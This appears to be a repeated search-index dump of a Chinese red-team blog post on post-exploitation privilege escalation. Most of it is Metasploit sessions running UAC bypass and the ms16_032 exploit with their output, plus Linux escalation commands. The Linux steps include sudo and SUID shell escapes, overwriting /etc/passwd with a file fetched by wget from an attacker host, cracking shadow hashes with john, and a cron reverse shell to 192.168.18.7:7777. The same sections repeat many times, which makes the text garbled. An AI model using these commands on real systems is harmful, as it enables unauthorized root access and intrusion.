exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. [+] 192.168.43.87 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Post module execution completed //以上为查找出来的可利用的漏洞 ​ msf5 post(multi/recon/local_exploit_suggester) \u003e use exploit/windows/local/ms16_032_secondary_logon_handle_privesc //选择上面的任意一个漏洞模块进入 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e show options //查看需要设置的参数 ​ Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc): ​ Name Current Setting Required Description ​ ---- --------------- -------- ----------- ​ SESSION yes The session to run this module on. ​ ​ Exploit target: ​ Id Name ​ -- ---- ​ 0 Windows x86 ​ msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e set session 1 session =\u003e 1 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e exploit ​ [*] Started reverse TCP handler on 192.168.43.6:4444 [+] Compressed size: 1016 [!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell [*] Writing payload file, C:\\Users\\testuser\\AppData\\Local\\Temp\\GLDpeYcGYT.ps1... [*] Compressing script contents... [+] Compressed size: 3596 [*] Executing exploit script... __ __ ___ ___ ___ ___ ___ ___ [*] Sending stage (180291 bytes) to 192.168.43.87 ​ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -\u003e @FuzzySec] ​ [?] Operating system core count: 4 [\u003e] Duplicating CreateProcessWithLogonW h","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:1","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#25-令牌窃取提权"},{"categories":["hvv"],"content":"\rwindows提权Windows常见权限分类： * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.提权辅助脚本 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 2.msf提权\r2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限 （权限为Administrator时大概率会成功，其他可能需要绕UAC） ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 2.2 suggester辅助脚本提权会话派发到msf meterpreter \u003e getuid //查看权限 Server username: HACK\\testuser meterpreter \u003e background //当前激活的shell切换到后台 [*] Backgrounding session 1... msf5 exploit(multi/handler) \u003e search suggester //查找辅助提权模块 ​ Matching Modules ================ ​ # Name Disclosure Date Rank Check Description ​ - ---- --------------- ---- ----- ----------- ​ 0 post/multi/recon/local_exploit_suggester normal No Multi Recon Local Exploit Suggester ​ msf5 exploit(multi/handler) \u003e use 0 msf5 post(multi/recon/local_exploit_suggester) \u003e sessions //查看会话 ​ Active sessions =============== ​ Id Name Type Information Connection ​ -- ---- ---- ----------- ---------- ​ 1 meterpreter x86/windows HACK\\testuser @ WIN-1EVLV0JUJD6 192.168.43.6:8866 -\u003e 192.168.43.87:49394 (192.168.43.87) ​ msf5 post(multi/recon/local_exploit_suggester) \u003e set session 1 //设置会话 session =\u003e 1 msf5 post(multi/recon/local_exploit_suggester) \u003e exploit ​ [*] 192.168.43.87 - Collecting local exploits for x86/windows... [*] 192.168.43.87 - 30 exploit checks are being tried... [+] 192.168.43.87 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. [+] 192.168.43.87 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Post module execution completed //以上为查找出来的可利用的漏洞 ​ msf5 post(multi/recon/local_exploit_suggester) \u003e use exploit/windows/local/ms16_032_secondary_logon_handle_privesc //选择上面的任意一个漏洞模块进入 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e show options //查看需要设置的参数 ​ Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc): ​ Name Current Setting Required Description ​ ---- --------------- -------- ----------- ​ SESSION yes The session to run this module on. ​ ​ Exploit target: ​ Id Name ​ -- ---- ​ 0 Windows x86 ​ msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e set session 1 session =\u003e 1 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e exploit ​ [*] Started reverse TCP handler on 192.168.43.6:4444 [+] Compressed size: 1016 [!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell [*] Writing payload file, C:\\Users\\testuser\\AppData\\Local\\Temp\\GLDpeYcGYT.ps1... [*] Compressing script contents... [+] Compressed size: 3596 [*] Executing exploit script... __ __ ___ ___ ___ ___ ___ ___ [*] Sending stage (180291 bytes) to 192.168.43.87 ​ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -\u003e @FuzzySec] ​ [?] Operating system core count: 4 [\u003e] Duplicating CreateProcessWithLogonW h","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:1","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#3psexec提权"},{"categories":["hvv"],"content":"\rwindows提权Windows常见权限分类： * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.提权辅助脚本 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 2.msf提权\r2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限 （权限为Administrator时大概率会成功，其他可能需要绕UAC） ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 2.2 suggester辅助脚本提权会话派发到msf meterpreter \u003e getuid //查看权限 Server username: HACK\\testuser meterpreter \u003e background //当前激活的shell切换到后台 [*] Backgrounding session 1... msf5 exploit(multi/handler) \u003e search suggester //查找辅助提权模块 ​ Matching Modules ================ ​ # Name Disclosure Date Rank Check Description ​ - ---- --------------- ---- ----- ----------- ​ 0 post/multi/recon/local_exploit_suggester normal No Multi Recon Local Exploit Suggester ​ msf5 exploit(multi/handler) \u003e use 0 msf5 post(multi/recon/local_exploit_suggester) \u003e sessions //查看会话 ​ Active sessions =============== ​ Id Name Type Information Connection ​ -- ---- ---- ----------- ---------- ​ 1 meterpreter x86/windows HACK\\testuser @ WIN-1EVLV0JUJD6 192.168.43.6:8866 -\u003e 192.168.43.87:49394 (192.168.43.87) ​ msf5 post(multi/recon/local_exploit_suggester) \u003e set session 1 //设置会话 session =\u003e 1 msf5 post(multi/recon/local_exploit_suggester) \u003e exploit ​ [*] 192.168.43.87 - Collecting local exploits for x86/windows... [*] 192.168.43.87 - 30 exploit checks are being tried... [+] 192.168.43.87 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. [+] 192.168.43.87 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Post module execution completed //以上为查找出来的可利用的漏洞 ​ msf5 post(multi/recon/local_exploit_suggester) \u003e use exploit/windows/local/ms16_032_secondary_logon_handle_privesc //选择上面的任意一个漏洞模块进入 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e show options //查看需要设置的参数 ​ Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc): ​ Name Current Setting Required Description ​ ---- --------------- -------- ----------- ​ SESSION yes The session to run this module on. ​ ​ Exploit target: ​ Id Name ​ -- ---- ​ 0 Windows x86 ​ msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e set session 1 session =\u003e 1 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e exploit ​ [*] Started reverse TCP handler on 192.168.43.6:4444 [+] Compressed size: 1016 [!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell [*] Writing payload file, C:\\Users\\testuser\\AppData\\Local\\Temp\\GLDpeYcGYT.ps1... [*] Compressing script contents... [+] Compressed size: 3596 [*] Executing exploit script... __ __ ___ ___ ___ ___ ___ ___ [*] Sending stage (180291 bytes) to 192.168.43.87 ​ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -\u003e @FuzzySec] ​ [?] Operating system core count: 4 [\u003e] Duplicating CreateProcessWithLogonW h","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:1","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#4注册表提权"},{"categories":["hvv"],"content":"\rLinux提权\r1 内核溢出提权 uname -a 查看系统版本和内核信息 使用searchsploit在kali 查找相关内核漏洞 searchsploit -t Ubuntu 14.04 2.sudo提权 sudo --version //查看版本 sudo -l //查看当前用户可以使用的sudo的命令程序 常规提权：（需要当前用户密码，如果管理员在/etc/sudoers配置了某些命令免密码使用，则可以利用该命令进行提权） 利用find: sudo find . -exec /bin/sh \\; -quit或者sudo awk 'BEGIN {system(\"/bin/sh\")}' python命令提权(su root被禁止登录，python获取交互shell) sudo python -c 'import pty;pty.spawn(\"/bin/bash\")' 其他漏洞CVE-2019-14287、CVE-2021-3156 3.suid提权① 查找具有suid权限文件： find / -user root -perm -4000 -print 2\u003e/dev/null find / -perm -u=s -type f 2\u003e/dev/null find / -user root -perm -4000 -exec ls -ldb {} \\; 执行命令： find filename -exec whoami \\; //以SUID即root权限执行命令 如果是/usr/bin/bash执行bash -p //将以root权限打开一个bash shell ② nmap(旧版本的 Nmap（2.02 到 5.21）具有交互模式，允许用户执行 shell 命令) nmap -v //查看版本 root@localhost:~# nmap --interactive //交互模式 nmap\u003e !sh root@localhost:~# whoami root ③ vim Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。 vim.tiny /etc/shadow //读取文件 vim来打开shell vim.tiny # Press ESC key :set shell=/bin/sh :shell 4.su sudo su - #使用root用户登录，不用输入root密码即可切换 ​ 利用python获取交互Shell python -c 'import pty;pty.spawn(\"/bin/sh\")' sudo su 5.任务计划 ls -l /etc/cron* cat /etc/crontab 在发现有一些计划任务时，我们就可以去检查是否存在一些问题导致权限的提升； 如权限配置不当777的执行脚本，则可以修改脚本内容进行提权； 6.覆盖passwd提权 通过OpenSSL passwd生成一个新的用户hacker，密码为hack123 openssl passwd -1 -salt hacker 123456 $1$hacker$6luIRwdGpBvXdP.GMwcZp/ 将hacker:$1$hacker6luIRwdGpBvXdP.GMwcZp/:0:0:/root:/bin/bash追加到passwd中 将Kali上的passwd文件下载到靶机etc目录下并覆盖原来的passwd文件 wget http://192.168.18.7/passwd -O /etc/passwd 然后在反弹shell中切换用户，或者使用ssh登录都可以 7.ssh密钥提权 cat /etc/passwd | grep bash #查找bash的用户 用MD5校验，authorized_keys id_rsa 为同一个文件 跳转到.ssh目录 将id_rsa下载到本地设置权限 600 登录 假如root存在isa文件 且可以拿到，那么经过以上步骤就能拿到root权限 8.john破解shadow root密文登陆提权john会自动检测密文类型 –wordlist 字段文件 john --wordlist=\"/usr/share/wordlists/rockyou.txt\" userpassw 9.Ubuntu计划任务反弹shell提权 cat /etc/crontab #查看计划任务 crontab -l #查看当前用户的计划任务 ls /var/spool/cron/crontabs/root #root任务文件目录 默认情况下非root权限不可见 tail -f /var/log/syslog 通过syslog 查看日志，发现cleanup.py文件每分钟会以root权限运行一次 发现当前用户可以修改cleanup.py文件 尝试修改计划任务进行反弹shell bash -i \u003e\u0026 /dev/tcp/192.168.18.7/7777 \u003e\u00261 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:2","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#linux提权"},{"categories":["hvv"],"content":"\rLinux提权\r1 内核溢出提权 uname -a 查看系统版本和内核信息 使用searchsploit在kali 查找相关内核漏洞 searchsploit -t Ubuntu 14.04 2.sudo提权 sudo --version //查看版本 sudo -l //查看当前用户可以使用的sudo的命令程序 常规提权：（需要当前用户密码，如果管理员在/etc/sudoers配置了某些命令免密码使用，则可以利用该命令进行提权） 利用find: sudo find . -exec /bin/sh \\; -quit或者sudo awk 'BEGIN {system(\"/bin/sh\")}' python命令提权(su root被禁止登录，python获取交互shell) sudo python -c 'import pty;pty.spawn(\"/bin/bash\")' 其他漏洞CVE-2019-14287、CVE-2021-3156 3.suid提权① 查找具有suid权限文件： find / -user root -perm -4000 -print 2\u003e/dev/null find / -perm -u=s -type f 2\u003e/dev/null find / -user root -perm -4000 -exec ls -ldb {} \\; 执行命令： find filename -exec whoami \\; //以SUID即root权限执行命令 如果是/usr/bin/bash执行bash -p //将以root权限打开一个bash shell ② nmap(旧版本的 Nmap（2.02 到 5.21）具有交互模式，允许用户执行 shell 命令) nmap -v //查看版本 root@localhost:~# nmap --interactive //交互模式 nmap\u003e !sh root@localhost:~# whoami root ③ vim Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。 vim.tiny /etc/shadow //读取文件 vim来打开shell vim.tiny # Press ESC key :set shell=/bin/sh :shell 4.su sudo su - #使用root用户登录，不用输入root密码即可切换 ​ 利用python获取交互Shell python -c 'import pty;pty.spawn(\"/bin/sh\")' sudo su 5.任务计划 ls -l /etc/cron* cat /etc/crontab 在发现有一些计划任务时，我们就可以去检查是否存在一些问题导致权限的提升； 如权限配置不当777的执行脚本，则可以修改脚本内容进行提权； 6.覆盖passwd提权 通过OpenSSL passwd生成一个新的用户hacker，密码为hack123 openssl passwd -1 -salt hacker 123456 $1$hacker$6luIRwdGpBvXdP.GMwcZp/ 将hacker:$1$hacker6luIRwdGpBvXdP.GMwcZp/:0:0:/root:/bin/bash追加到passwd中 将Kali上的passwd文件下载到靶机etc目录下并覆盖原来的passwd文件 wget http://192.168.18.7/passwd -O /etc/passwd 然后在反弹shell中切换用户，或者使用ssh登录都可以 7.ssh密钥提权 cat /etc/passwd | grep bash #查找bash的用户 用MD5校验，authorized_keys id_rsa 为同一个文件 跳转到.ssh目录 将id_rsa下载到本地设置权限 600 登录 假如root存在isa文件 且可以拿到，那么经过以上步骤就能拿到root权限 8.john破解shadow root密文登陆提权john会自动检测密文类型 –wordlist 字段文件 john --wordlist=\"/usr/share/wordlists/rockyou.txt\" userpassw 9.Ubuntu计划任务反弹shell提权 cat /etc/crontab #查看计划任务 crontab -l #查看当前用户的计划任务 ls /var/spool/cron/crontabs/root #root任务文件目录 默认情况下非root权限不可见 tail -f /var/log/syslog 通过syslog 查看日志，发现cleanup.py文件每分钟会以root权限运行一次 发现当前用户可以修改cleanup.py文件 尝试修改计划任务进行反弹shell bash -i \u003e\u0026 /dev/tcp/192.168.18.7/7777 \u003e\u00261 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:2","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#1-内核溢出提权"},{"categories":["hvv"],"content":"\rLinux提权\r1 内核溢出提权 uname -a 查看系统版本和内核信息 使用searchsploit在kali 查找相关内核漏洞 searchsploit -t Ubuntu 14.04 2.sudo提权 sudo --version //查看版本 sudo -l //查看当前用户可以使用的sudo的命令程序 常规提权：（需要当前用户密码，如果管理员在/etc/sudoers配置了某些命令免密码使用，则可以利用该命令进行提权） 利用find: sudo find . -exec /bin/sh \\; -quit或者sudo awk 'BEGIN {system(\"/bin/sh\")}' python命令提权(su root被禁止登录，python获取交互shell) sudo python -c 'import pty;pty.spawn(\"/bin/bash\")' 其他漏洞CVE-2019-14287、CVE-2021-3156 3.suid提权① 查找具有suid权限文件： find / -user root -perm -4000 -print 2\u003e/dev/null find / -perm -u=s -type f 2\u003e/dev/null find / -user root -perm -4000 -exec ls -ldb {} \\; 执行命令： find filename -exec whoami \\; //以SUID即root权限执行命令 如果是/usr/bin/bash执行bash -p //将以root权限打开一个bash shell ② nmap(旧版本的 Nmap（2.02 到 5.21）具有交互模式，允许用户执行 shell 命令) nmap -v //查看版本 root@localhost:~# nmap --interactive //交互模式 nmap\u003e !sh root@localhost:~# whoami root ③ vim Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。 vim.tiny /etc/shadow //读取文件 vim来打开shell vim.tiny # Press ESC key :set shell=/bin/sh :shell 4.su sudo su - #使用root用户登录，不用输入root密码即可切换 ​ 利用python获取交互Shell python -c 'import pty;pty.spawn(\"/bin/sh\")' sudo su 5.任务计划 ls -l /etc/cron* cat /etc/crontab 在发现有一些计划任务时，我们就可以去检查是否存在一些问题导致权限的提升； 如权限配置不当777的执行脚本，则可以修改脚本内容进行提权； 6.覆盖passwd提权 通过OpenSSL passwd生成一个新的用户hacker，密码为hack123 openssl passwd -1 -salt hacker 123456 $1$hacker$6luIRwdGpBvXdP.GMwcZp/ 将hacker:$1$hacker6luIRwdGpBvXdP.GMwcZp/:0:0:/root:/bin/bash追加到passwd中 将Kali上的passwd文件下载到靶机etc目录下并覆盖原来的passwd文件 wget http://192.168.18.7/passwd -O /etc/passwd 然后在反弹shell中切换用户，或者使用ssh登录都可以 7.ssh密钥提权 cat /etc/passwd | grep bash #查找bash的用户 用MD5校验，authorized_keys id_rsa 为同一个文件 跳转到.ssh目录 将id_rsa下载到本地设置权限 600 登录 假如root存在isa文件 且可以拿到，那么经过以上步骤就能拿到root权限 8.john破解shadow root密文登陆提权john会自动检测密文类型 –wordlist 字段文件 john --wordlist=\"/usr/share/wordlists/rockyou.txt\" userpassw 9.Ubuntu计划任务反弹shell提权 cat /etc/crontab #查看计划任务 crontab -l #查看当前用户的计划任务 ls /var/spool/cron/crontabs/root #root任务文件目录 默认情况下非root权限不可见 tail -f /var/log/syslog 通过syslog 查看日志，发现cleanup.py文件每分钟会以root权限运行一次 发现当前用户可以修改cleanup.py文件 尝试修改计划任务进行反弹shell bash -i \u003e\u0026 /dev/tcp/192.168.18.7/7777 \u003e\u00261 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:2","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#2sudo提权"},{"categories":["hvv"],"content":"\rLinux提权\r1 内核溢出提权 uname -a 查看系统版本和内核信息 使用searchsploit在kali 查找相关内核漏洞 searchsploit -t Ubuntu 14.04 2.sudo提权 sudo --version //查看版本 sudo -l //查看当前用户可以使用的sudo的命令程序 常规提权：（需要当前用户密码，如果管理员在/etc/sudoers配置了某些命令免密码使用，则可以利用该命令进行提权） 利用find: sudo find . -exec /bin/sh \\; -quit或者sudo awk 'BEGIN {system(\"/bin/sh\")}' python命令提权(su root被禁止登录，python获取交互shell) sudo python -c 'import pty;pty.spawn(\"/bin/bash\")' 其他漏洞CVE-2019-14287、CVE-2021-3156 3.suid提权① 查找具有suid权限文件： find / -user root -perm -4000 -print 2\u003e/dev/null find / -perm -u=s -type f 2\u003e/dev/null find / -user root -perm -4000 -exec ls -ldb {} \\; 执行命令： find filename -exec whoami \\; //以SUID即root权限执行命令 如果是/usr/bin/bash执行bash -p //将以root权限打开一个bash shell ② nmap(旧版本的 Nmap（2.02 到 5.21）具有交互模式，允许用户执行 shell 命令) nmap -v //查看版本 root@localhost:~# nmap --interactive //交互模式 nmap\u003e !sh root@localhost:~# whoami root ③ vim Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。 vim.tiny /etc/shadow //读取文件 vim来打开shell vim.tiny # Press ESC key :set shell=/bin/sh :shell 4.su sudo su - #使用root用户登录，不用输入root密码即可切换 ​ 利用python获取交互Shell python -c 'import pty;pty.spawn(\"/bin/sh\")' sudo su 5.任务计划 ls -l /etc/cron* cat /etc/crontab 在发现有一些计划任务时，我们就可以去检查是否存在一些问题导致权限的提升； 如权限配置不当777的执行脚本，则可以修改脚本内容进行提权； 6.覆盖passwd提权 通过OpenSSL passwd生成一个新的用户hacker，密码为hack123 openssl passwd -1 -salt hacker 123456 $1$hacker$6luIRwdGpBvXdP.GMwcZp/ 将hacker:$1$hacker6luIRwdGpBvXdP.GMwcZp/:0:0:/root:/bin/bash追加到passwd中 将Kali上的passwd文件下载到靶机etc目录下并覆盖原来的passwd文件 wget http://192.168.18.7/passwd -O /etc/passwd 然后在反弹shell中切换用户，或者使用ssh登录都可以 7.ssh密钥提权 cat /etc/passwd | grep bash #查找bash的用户 用MD5校验，authorized_keys id_rsa 为同一个文件 跳转到.ssh目录 将id_rsa下载到本地设置权限 600 登录 假如root存在isa文件 且可以拿到，那么经过以上步骤就能拿到root权限 8.john破解shadow root密文登陆提权john会自动检测密文类型 –wordlist 字段文件 john --wordlist=\"/usr/share/wordlists/rockyou.txt\" userpassw 9.Ubuntu计划任务反弹shell提权 cat /etc/crontab #查看计划任务 crontab -l #查看当前用户的计划任务 ls /var/spool/cron/crontabs/root #root任务文件目录 默认情况下非root权限不可见 tail -f /var/log/syslog 通过syslog 查看日志，发现cleanup.py文件每分钟会以root权限运行一次 发现当前用户可以修改cleanup.py文件 尝试修改计划任务进行反弹shell bash -i \u003e\u0026 /dev/tcp/192.168.18.7/7777 \u003e\u00261 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:2","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#3suid提权"},{"categories":["hvv"],"content":"\rLinux提权\r1 内核溢出提权 uname -a 查看系统版本和内核信息 使用searchsploit在kali 查找相关内核漏洞 searchsploit -t Ubuntu 14.04 2.sudo提权 sudo --version //查看版本 sudo -l //查看当前用户可以使用的sudo的命令程序 常规提权：（需要当前用户密码，如果管理员在/etc/sudoers配置了某些命令免密码使用，则可以利用该命令进行提权） 利用find: sudo find . -exec /bin/sh \\; -quit或者sudo awk 'BEGIN {system(\"/bin/sh\")}' python命令提权(su root被禁止登录，python获取交互shell) sudo python -c 'import pty;pty.spawn(\"/bin/bash\")' 其他漏洞CVE-2019-14287、CVE-2021-3156 3.suid提权① 查找具有suid权限文件： find / -user root -perm -4000 -print 2\u003e/dev/null find / -perm -u=s -type f 2\u003e/dev/null find / -user root -perm -4000 -exec ls -ldb {} \\; 执行命令： find filename -exec whoami \\; //以SUID即root权限执行命令 如果是/usr/bin/bash执行bash -p //将以root权限打开一个bash shell ② nmap(旧版本的 Nmap（2.02 到 5.21）具有交互模式，允许用户执行 shell 命令) nmap -v //查看版本 root@localhost:~# nmap --interactive //交互模式 nmap\u003e !sh root@localhost:~# whoami root ③ vim Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。 vim.tiny /etc/shadow //读取文件 vim来打开shell vim.tiny # Press ESC key :set shell=/bin/sh :shell 4.su sudo su - #使用root用户登录，不用输入root密码即可切换 ​ 利用python获取交互Shell python -c 'import pty;pty.spawn(\"/bin/sh\")' sudo su 5.任务计划 ls -l /etc/cron* cat /etc/crontab 在发现有一些计划任务时，我们就可以去检查是否存在一些问题导致权限的提升； 如权限配置不当777的执行脚本，则可以修改脚本内容进行提权； 6.覆盖passwd提权 通过OpenSSL passwd生成一个新的用户hacker，密码为hack123 openssl passwd -1 -salt hacker 123456 $1$hacker$6luIRwdGpBvXdP.GMwcZp/ 将hacker:$1$hacker6luIRwdGpBvXdP.GMwcZp/:0:0:/root:/bin/bash追加到passwd中 将Kali上的passwd文件下载到靶机etc目录下并覆盖原来的passwd文件 wget http://192.168.18.7/passwd -O /etc/passwd 然后在反弹shell中切换用户，或者使用ssh登录都可以 7.ssh密钥提权 cat /etc/passwd | grep bash #查找bash的用户 用MD5校验，authorized_keys id_rsa 为同一个文件 跳转到.ssh目录 将id_rsa下载到本地设置权限 600 登录 假如root存在isa文件 且可以拿到，那么经过以上步骤就能拿到root权限 8.john破解shadow root密文登陆提权john会自动检测密文类型 –wordlist 字段文件 john --wordlist=\"/usr/share/wordlists/rockyou.txt\" userpassw 9.Ubuntu计划任务反弹shell提权 cat /etc/crontab #查看计划任务 crontab -l #查看当前用户的计划任务 ls /var/spool/cron/crontabs/root #root任务文件目录 默认情况下非root权限不可见 tail -f /var/log/syslog 通过syslog 查看日志，发现cleanup.py文件每分钟会以root权限运行一次 发现当前用户可以修改cleanup.py文件 尝试修改计划任务进行反弹shell bash -i \u003e\u0026 /dev/tcp/192.168.18.7/7777 \u003e\u00261 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:2","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#4su"},{"categories":["hvv"],"content":"\rLinux提权\r1 内核溢出提权 uname -a 查看系统版本和内核信息 使用searchsploit在kali 查找相关内核漏洞 searchsploit -t Ubuntu 14.04 2.sudo提权 sudo --version //查看版本 sudo -l //查看当前用户可以使用的sudo的命令程序 常规提权：（需要当前用户密码，如果管理员在/etc/sudoers配置了某些命令免密码使用，则可以利用该命令进行提权） 利用find: sudo find . -exec /bin/sh \\; -quit或者sudo awk 'BEGIN {system(\"/bin/sh\")}' python命令提权(su root被禁止登录，python获取交互shell) sudo python -c 'import pty;pty.spawn(\"/bin/bash\")' 其他漏洞CVE-2019-14287、CVE-2021-3156 3.suid提权① 查找具有suid权限文件： find / -user root -perm -4000 -print 2\u003e/dev/null find / -perm -u=s -type f 2\u003e/dev/null find / -user root -perm -4000 -exec ls -ldb {} \\; 执行命令： find filename -exec whoami \\; //以SUID即root权限执行命令 如果是/usr/bin/bash执行bash -p //将以root权限打开一个bash shell ② nmap(旧版本的 Nmap（2.02 到 5.21）具有交互模式，允许用户执行 shell 命令) nmap -v //查看版本 root@localhost:~# nmap --interactive //交互模式 nmap\u003e !sh root@localhost:~# whoami root ③ vim Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。 vim.tiny /etc/shadow //读取文件 vim来打开shell vim.tiny # Press ESC key :set shell=/bin/sh :shell 4.su sudo su - #使用root用户登录，不用输入root密码即可切换 ​ 利用python获取交互Shell python -c 'import pty;pty.spawn(\"/bin/sh\")' sudo su 5.任务计划 ls -l /etc/cron* cat /etc/crontab 在发现有一些计划任务时，我们就可以去检查是否存在一些问题导致权限的提升； 如权限配置不当777的执行脚本，则可以修改脚本内容进行提权； 6.覆盖passwd提权 通过OpenSSL passwd生成一个新的用户hacker，密码为hack123 openssl passwd -1 -salt hacker 123456 $1$hacker$6luIRwdGpBvXdP.GMwcZp/ 将hacker:$1$hacker6luIRwdGpBvXdP.GMwcZp/:0:0:/root:/bin/bash追加到passwd中 将Kali上的passwd文件下载到靶机etc目录下并覆盖原来的passwd文件 wget http://192.168.18.7/passwd -O /etc/passwd 然后在反弹shell中切换用户，或者使用ssh登录都可以 7.ssh密钥提权 cat /etc/passwd | grep bash #查找bash的用户 用MD5校验，authorized_keys id_rsa 为同一个文件 跳转到.ssh目录 将id_rsa下载到本地设置权限 600 登录 假如root存在isa文件 且可以拿到，那么经过以上步骤就能拿到root权限 8.john破解shadow root密文登陆提权john会自动检测密文类型 –wordlist 字段文件 john --wordlist=\"/usr/share/wordlists/rockyou.txt\" userpassw 9.Ubuntu计划任务反弹shell提权 cat /etc/crontab #查看计划任务 crontab -l #查看当前用户的计划任务 ls /var/spool/cron/crontabs/root #root任务文件目录 默认情况下非root权限不可见 tail -f /var/log/syslog 通过syslog 查看日志，发现cleanup.py文件每分钟会以root权限运行一次 发现当前用户可以修改cleanup.py文件 尝试修改计划任务进行反弹shell bash -i \u003e\u0026 /dev/tcp/192.168.18.7/7777 \u003e\u00261 